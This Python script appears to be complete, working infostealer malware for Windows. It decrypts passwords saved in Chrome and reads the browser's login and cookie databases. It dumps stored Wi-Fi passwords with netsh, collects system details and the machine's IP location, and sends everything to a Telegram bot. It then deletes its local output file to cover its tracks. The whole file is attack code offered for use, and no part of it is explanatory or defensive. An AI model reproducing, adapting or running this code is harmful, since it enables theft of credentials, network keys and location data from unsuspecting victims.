import base64
import json
import os
import pathlib
import platform
import re
import shutil
import socket
import sqlite3
import subprocess
import uuid
from datetime import datetime
from datetime import timedelta
from pathlib import Path

import psutil
import requests
import win32crypt
from Cryptodome.Cipher import AES
from dotenv import load_dotenv

load_dotenv()


def get_data_by_ip():
    try:
        response = requests.get('http://ip-api.com/json/').json()
        data = {
            '[IP]': response.get('query'),
            '[Int prov]': response.get('isp'),
            '[Org]': response.get('org'),
            '[Country]': response.get('country'),
            '[Region Name]': response.get('regionName'),
            '[City]': response.get('city'),
            '[ZIP]': response.get('zip'),
            '[Lat]': response.get('lat'),
            '[Lon]': response.get('lon'),
        }
        return data
    except requests.exceptions.ConnectionError:
        return 'No internet'


def get_system_info():
    """Get all main system information"""

    info = {'platform': platform.system(), 'platform-release': platform.release(),
            'platform-version': platform.version(), 'architecture': platform.machine(),
            'hostname': socket.gethostname(), 'ip-address': socket.gethostbyname(socket.gethostname()),
            'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())), 'processor': platform.processor(),
            'ram': str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"}
    return info


def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""

    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    """Getting an encryption for our password"""

    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    """Decrypt our password using encryption key"""

    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(password)[:-16].decode()
        return decrypted_password
    except RuntimeError:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except RuntimeError:
            return ""


def find_all_files(name, path):
    """Find all files with a certain name"""

    result = []
    for root, dirs, files in os.walk(path):
        if name in files:
            result.append(os.path.join(root, name))
    return result


def get_cookies(file_name):
    """Getting cookies from chrome"""

    key = get_encryption_key()

    path_to_chrome = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data"

    paths_to_cookies = list(find_all_files('Cookies', path_to_chrome))
    paths_to_files = list(find_all_files('Login Data', path_to_chrome))

    all_paths = paths_to_cookies + paths_to_files

    for path in all_paths:
        source = Path(path)

        destination = str(pathlib.Path(__file__).parent.resolve()) + r"\cookies"
        shutil.copy(source, destination)

        connection = sqlite3.connect(destination)
        cursor = connection.cursor()

        list_of_tables = cursor.execute(
            """SELECT name FROM sqlite_master WHERE type='table'
            AND name='logins';""").fetchall()

        if len(list_of_tables) == 0:
            continue
        else:
            all_raws = cursor.execute(
                """SELECT origin_url, action_url, username_value,
                password_value, date_created, date_last_used FROM logins""")

            for row in all_raws.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    with open(file=file_name, mode='a', encoding='utf-8') as file:
                        file.write(f'{"=" * 50}\n')
                    with open(file=file_name, mode='a', encoding='utf-8') as file:
                        file.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\n"
                                   f"Username: {username}\nPassword: {password}\n")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    with open(file=file_name, mode='a', encoding='utf-8') as file:
                        file.write(f'Creation date: {str(get_chrome_datetime(date_created))}\n')
                if date_last_used != 86400000000 and date_last_used:
                    with open(file=file_name, mode='a', encoding='utf-8') as file:
                        file.write(f'Last Used: {str(get_chrome_datetime(date_last_used))}\n')
                with open(file=file_name, mode='a', encoding='utf-8') as file:
                    file.write(f'{"=" * 50}\n\n\n')


def get_all_information():
    """Extracting Windows Wi-Fi passwords, all main system infromation
    and cookies into .txt file"""

    main_comp_info = get_system_info()
    list_of_keys = list(main_comp_info.keys())
    file_name = f'system_info__{main_comp_info.get(list_of_keys[4])}.txt'
    profile_info = ''
    rus_names = ['Все профили пользователей', 'Содержимое ключа']
    eng_names = ['All User Profile', 'Key Content']

    profiles_data = subprocess.check_output('netsh wlan show profiles').decode('CP866').split('\n')
    profiles = [i.split(':')[1].strip() for i in profiles_data if rus_names[0] in i or eng_names[0] in i]

    for profile in profiles:
        output_string = f'netsh wlan show profile {profile} key=clear'

        # Trying to decode profile info from bytes to CP866
        try:
            profile_info = subprocess.check_output(output_string).decode('CP866').split('\n')
        except subprocess.CalledProcessError:
            pass

        # Trying to get necessery passwords from list of decoded profiles
        try:
            password = [i.split(':')[1].strip() for i in profile_info if rus_names[1] in i or eng_names[1] in i][0]
        except IndexError:
            password = None

        # Writing down main system information into file
        if profile == profiles[0]:
            for key, value in main_comp_info.items():
                with open(file=file_name, mode='a', encoding='utf-8') as file:
                    file.write(f'{key.capitalize()}: {value}\n')
            with open(file=file_name, mode='a', encoding='utf-8') as file:
                file.write('\n')

        # Writing down wifi profiles' information
        with open(file=file_name, mode='a', encoding='utf-8') as file:
            file.write(f'Profile: {profile}\nPassword: {password}\n\n')

    # Getting all users' cookies
    get_cookies(file_name)

    # Getting IP address
    ip_data = get_data_by_ip()

    if ip_data == 'No internet':
        with open(file=file_name, mode='a', encoding='utf-8') as file:
            file.write(f'Sorry... There were no internet connection.')
    else:
        for k, v in ip_data.items():
            with open(file=file_name, mode='a', encoding='utf-8') as file:
                file.write(f'{k}: {v}\n')

    token = os.getenv('TOKEN')
    chat_id = os.getenv('CHAT_ID')
    url = f'https://api.telegram.org/bot{token}/sendDocument?chat_id={chat_id}'

    # Trying to send file via telegram bot
    try:
        requests.post(url, files={'document': open(file=file_name, encoding='utf-8')})
    except requests.exceptions.Timeout:
        pass
    except requests.exceptions.TooManyRedirects:
        pass
    except requests.exceptions.RequestException:
        pass

    # Trying to delete file from folder
    try:
        os.remove(file_name)
        os.remove(str(pathlib.Path(__file__).parent.resolve()) + r"\cookies")
    except OSError:
        pass


def main():
    get_all_information()


if __name__ == '__main__':
    main()
